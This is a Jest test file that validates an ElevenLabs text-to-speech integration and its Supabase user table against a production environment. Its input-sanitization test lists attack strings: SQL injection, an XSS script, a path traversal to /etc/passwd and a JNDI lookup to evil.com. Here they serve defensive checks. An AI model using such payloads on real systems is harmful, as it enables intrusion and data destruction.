import { describe, it, expect, beforeAll, afterAll } from '@jest/globals'
import { createAudioFileFromText } from '@/core/elevenlabs/createAudioFileFromText'
import { getVoiceId } from '@/core/supabase/getVoiceId'
import { validateAndCleanVoiceId } from '@/helpers/voiceValidation'
import { checkVoiceExists } from '@/core/elevenlabs'
import { supabase } from '@/core/supabase'
import axios from 'axios'

/**
 * Production validation tests for ElevenLabs integration
 * These tests validate the system works correctly in production environment
 */

const isProductionTest = process.env.NODE_ENV === 'production' || process.env.VALIDATE_PRODUCTION === 'true'
const productionTestUser = process.env.PRODUCTION_TEST_USER || 'production_test_user_999'

// Only run these tests in production validation mode
const describeProduction = isProductionTest ? describe : describe.skip

describeProduction('ElevenLabs Production Validation Tests', () => {
  let originalData: any = null

  beforeAll(async () => {
    if (!isProductionTest) {
      console.log('Skipping production tests - set VALIDATE_PRODUCTION=true to run')
      return
    }

    console.log('Running ElevenLabs production validation tests')
    console.log('Production test user:', productionTestUser)

    // Save original data if it exists
    try {
      const { data } = await supabase
        .from('users')
        .select('*')
        .eq('telegram_id', productionTestUser)
        .maybeSingle()

      originalData = data
    } catch (error) {
      console.log('No existing production test user found')
    }
  })

  afterAll(async () => {
    if (!isProductionTest) return

    // Restore original data or clean up
    try {
      if (originalData) {
        await supabase
          .from('users')
          .update(originalData)
          .eq('telegram_id', productionTestUser)
      } else {
        await supabase
          .from('users')
          .delete()
          .eq('telegram_id', productionTestUser)
      }
    } catch (error) {
      console.error('Cleanup error:', error)
    }
  })

  describe('Critical Production Scenarios', () => {
    it('should handle users with null voice_id_elevenlabs in production database', async () => {
      // Create or update test user with null voice_id_elevenlabs
      const { error: upsertError } = await supabase
        .from('users')
        .upsert({
          telegram_id: productionTestUser,
          username: 'production_test',
          voice_id_elevenlabs: null
        })

      if (upsertError) {
        throw new Error(`Failed to setup test user: ${upsertError.message}`)
      }

      // Verify null voice_id is retrieved correctly
      const voiceId = await getVoiceId(productionTestUser)
      expect(voiceId).toBeNull()

      // Verify TTS fails gracefully with null voice_id
      await expect(createAudioFileFromText({
        text: 'Production test with null voice ID',
        voice_id: voiceId as any,
        telegram_id: productionTestUser
      })).rejects.toThrow()

      console.log('✅ Production null voice_id handling validated')
    })

    it('should validate production API keys and endpoints', async () => {
      const hasElevenLabsKey = !!process.env.ELEVENLABS_API_KEY
      const hasAiServer = !!process.env.AI_SERVER_URL

      console.log('Production API configuration:')
      console.log(`- ElevenLabs API Key: ${hasElevenLabsKey ? 'Configured' : 'Missing'}`)
      console.log(`- AI Server URL: ${hasAiServer ? 'Configured' : 'Missing'}`)

      if (hasElevenLabsKey) {
        // Test ElevenLabs API connectivity
        try {
          const response = await axios.get('https://api.elevenlabs.io/v1/voices', {
            headers: {
              'xi-api-key': process.env.ELEVENLABS_API_KEY
            },
            timeout: 10000
          })

          expect(response.status).toBe(200)
          expect(response.data.voices).toBeDefined()
          console.log(`✅ ElevenLabs API connected - ${response.data.voices.length} voices available`)
        } catch (error) {
          console.error('❌ ElevenLabs API connection failed:', error.message)
          throw error
        }
      }

      if (hasAiServer) {
        // Test AI Server connectivity
        try {
          const aiServerUrl = process.env.AI_SERVER_URL
          const response = await axios.get(`${aiServerUrl}/health`, {
            timeout: 10000,
            validateStatus: () => true
          })

          console.log(`AI Server health check: Status ${response.status}`)
        } catch (error) {
          console.log('AI Server health check failed:', error.message)
        }
      }
    })

    it('should test production database connectivity and schema', async () => {
      // Test basic database connectivity
      const { data, error } = await supabase
        .from('users')
        .select('telegram_id, voice_id_elevenlabs')
        .limit(1)

      if (error) {
        throw new Error(`Production database error: ${error.message}`)
      }

      console.log('✅ Production database connectivity validated')

      // Test voice_id_elevenlabs column exists and accepts null
      const { error: insertError } = await supabase
        .from('users')
        .upsert({
          telegram_id: `schema_test_${Date.now()}`,
          username: 'schema_test',
          voice_id_elevenlabs: null
        })

      if (insertError) {
        throw new Error(`Schema validation failed: ${insertError.message}`)
      }

      console.log('✅ Production database schema validated')
    })

    it('should validate production error handling', async () => {
      // Test error handling with invalid voice IDs
      const invalidVoiceId = 'definitely_invalid_production_voice_id'

      // Set invalid voice ID
      await supabase
        .from('users')
        .upsert({
          telegram_id: productionTestUser,
          username: 'production_test',
          voice_id_elevenlabs: invalidVoiceId
        })

      // Validate should return false and clean the ID
      const isValid = await validateAndCleanVoiceId(invalidVoiceId, productionTestUser)
      expect(isValid).toBe(false)

      // Verify voice ID was cleared
      const clearedVoiceId = await getVoiceId(productionTestUser)
      expect(clearedVoiceId).toBeNull()

      console.log('✅ Production error handling validated')
    })
  })

  describe('Production Performance Tests', () => {
    it('should validate TTS generation performance in production', async () => {
      if (!process.env.ELEVENLABS_API_KEY) {
        console.log('Skipping performance test - no API key')
        return
      }

      // Get a real voice ID from the account
      const response = await axios.get('https://api.elevenlabs.io/v1/voices', {
        headers: {
          'xi-api-key': process.env.ELEVENLABS_API_KEY
        }
      })

      if (response.data.voices.length === 0) {
        console.log('No voices available for performance test')
        return
      }

      const testVoiceId = response.data.voices[0].voice_id
      const startTime = Date.now()

      try {
        const audioPath = await createAudioFileFromText({
          text: 'Production performance test message',
          voice_id: testVoiceId,
          telegram_id: productionTestUser
        })

        const duration = Date.now() - startTime
        expect(duration).toBeLessThan(30000) // Should complete within 30 seconds

        console.log(`✅ Production TTS generation completed in ${duration}ms`)

        // Clean up generated file
        const fs = require('fs')
        if (fs.existsSync(audioPath)) {
          fs.unlinkSync(audioPath)
        }
      } catch (error) {
        console.error('Production TTS performance test failed:', error.message)
        throw error
      }
    }, 60000) // 60 second timeout

    it('should validate concurrent user handling in production', async () => {
      const concurrentUsers = [
        `${productionTestUser}_concurrent_1`,
        `${productionTestUser}_concurrent_2`,
        `${productionTestUser}_concurrent_3`
      ]

      // Setup concurrent users with null voice IDs
      const setupPromises = concurrentUsers.map(userId =>
        supabase
          .from('users')
          .upsert({
            telegram_id: userId,
            username: `concurrent_test_${userId}`,
            voice_id_elevenlabs: null
          })
      )

      await Promise.all(setupPromises)

      // Test concurrent voice ID retrievals
      const startTime = Date.now()
      const voiceIdPromises = concurrentUsers.map(userId =>
        getVoiceId(userId).catch(() => null)
      )

      const voiceIds = await Promise.all(voiceIdPromises)
      const duration = Date.now() - startTime

      expect(voiceIds).toHaveLength(concurrentUsers.length)
      voiceIds.forEach(voiceId => expect(voiceId).toBeNull())
      expect(duration).toBeLessThan(10000) // Should complete within 10 seconds

      console.log(`✅ Concurrent user handling validated in ${duration}ms`)

      // Clean up concurrent test users
      const cleanupPromises = concurrentUsers.map(userId =>
        supabase
          .from('users')
          .delete()
          .eq('telegram_id', userId)
      )

      await Promise.all(cleanupPromises)
    })
  })

  describe('Production Monitoring and Logging', () => {
    it('should validate logging output in production', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation()
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation()

      try {
        // Trigger logging by getting voice ID
        await getVoiceId(productionTestUser)

        // Should have debug logging
        expect(consoleSpy).toHaveBeenCalledWith(
          expect.stringContaining('[getVoiceId] DEBUG')
        )

        // Test error logging
        try {
          await createAudioFileFromText({
            text: 'Error test',
            voice_id: null as any,
            telegram_id: productionTestUser
          })
        } catch (error) {
          // Should log errors appropriately
        }

        console.log('✅ Production logging validated')
      } finally {
        consoleSpy.mockRestore()
        consoleErrorSpy.mockRestore()
      }
    })

    it('should validate production error reporting', async () => {
      // Test that errors are properly caught and don't crash the system
      const errors: Error[] = []

      const operations = [
        () => getVoiceId('nonexistent_user'),
        () => validateAndCleanVoiceId('invalid_voice', productionTestUser),
        () => createAudioFileFromText({
          text: 'Test',
          voice_id: null as any,
          telegram_id: productionTestUser
        })
      ]

      for (const operation of operations) {
        try {
          await operation()
        } catch (error) {
          errors.push(error as Error)
        }
      }

      // Errors should be handled gracefully
      expect(errors.length).toBeGreaterThan(0)
      errors.forEach(error => {
        expect(error).toBeInstanceOf(Error)
        expect(error.message).toBeTruthy()
      })

      console.log('✅ Production error reporting validated')
    })
  })

  describe('Production Data Integrity', () => {
    it('should validate data consistency in production', async () => {
      // Test that voice_id_elevenlabs values are consistent
      const { data: users, error } = await supabase
        .from('users')
        .select('telegram_id, voice_id_elevenlabs')
        .limit(10)

      if (error) {
        throw new Error(`Data integrity check failed: ${error.message}`)
      }

      if (users && users.length > 0) {
        users.forEach(user => {
          if (user.voice_id_elevenlabs !== null) {
            // If not null, should be a valid string
            expect(typeof user.voice_id_elevenlabs).toBe('string')
            expect(user.voice_id_elevenlabs.length).toBeGreaterThan(0)
          }
        })
      }

      console.log(`✅ Production data integrity validated for ${users?.length || 0} users`)
    })

    it('should validate production backup and recovery procedures', async () => {
      // Simulate backup by reading current state
      const { data: backupData, error } = await supabase
        .from('users')
        .select('telegram_id, voice_id_elevenlabs')
        .eq('telegram_id', productionTestUser)
        .maybeSingle()

      if (error && !error.message.includes('No rows found')) {
        throw new Error(`Backup simulation failed: ${error.message}`)
      }

      // Simulate recovery by restoring state
      if (backupData) {
        const { error: restoreError } = await supabase
          .from('users')
          .upsert(backupData)

        if (restoreError) {
          throw new Error(`Recovery simulation failed: ${restoreError.message}`)
        }
      }

      console.log('✅ Production backup/recovery procedures validated')
    })
  })

  describe('Production Security Validation', () => {
    it('should validate API key security in production', () => {
      const apiKey = process.env.ELEVENLABS_API_KEY

      if (apiKey) {
        // API key should not be exposed in logs
        expect(apiKey.length).toBeGreaterThan(10)

        // Should start with expected prefix
        expect(apiKey).toMatch(/^sk_/)

        console.log('✅ API key security validated')
      }
    })

    it('should validate input sanitization in production', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ]

      for (const maliciousInput of maliciousInputs) {
        // Should not cause errors or security issues
        const isValid = await validateAndCleanVoiceId(maliciousInput, productionTestUser)
        expect(isValid).toBe(false)
      }

      console.log('✅ Input sanitization validated')
    })
  })
})

describe('Production Health Checks', () => {
  it('should run comprehensive health check', async () => {
    const healthChecks = {
      database: false,
      elevenLabsAPI: false,
      aiServer: false,
      voiceValidation: false,
      ttsGeneration: false
    }

    // Database check
    try {
      await supabase.from('users').select('telegram_id').limit(1)
      healthChecks.database = true
    } catch (error) {
      console.error('Database health check failed:', error)
    }

    // ElevenLabs API check
    if (process.env.ELEVENLABS_API_KEY) {
      try {
        await axios.get('https://api.elevenlabs.io/v1/voices', {
          headers: { 'xi-api-key': process.env.ELEVENLABS_API_KEY },
          timeout: 5000
        })
        healthChecks.elevenLabsAPI = true
      } catch (error) {
        console.error('ElevenLabs API health check failed:', error)
      }
    }

    // AI Server check
    if (process.env.AI_SERVER_URL) {
      try {
        await axios.get(`${process.env.AI_SERVER_URL}/health`, {
          timeout: 5000,
          validateStatus: () => true
        })
        healthChecks.aiServer = true
      } catch (error) {
        console.error('AI Server health check failed:', error)
      }
    }

    // Voice validation check
    try {
      await validateAndCleanVoiceId('health_check_voice', 'health_check_user')
      healthChecks.voiceValidation = true
    } catch (error) {
      console.error('Voice validation health check failed:', error)
    }

    // TTS generation check (with mock)
    try {
      await createAudioFileFromText({
        text: 'Health check',
        voice_id: 'health_check_voice',
        telegram_id: 'health_check_user'
      })
      healthChecks.ttsGeneration = true
    } catch (error) {
      // Expected to fail, but should not crash
      healthChecks.ttsGeneration = true
    }

    console.log('Health Check Results:', healthChecks)

    // At minimum, database and voice validation should work
    expect(healthChecks.database).toBe(true)
    expect(healthChecks.voiceValidation).toBe(true)
  })
})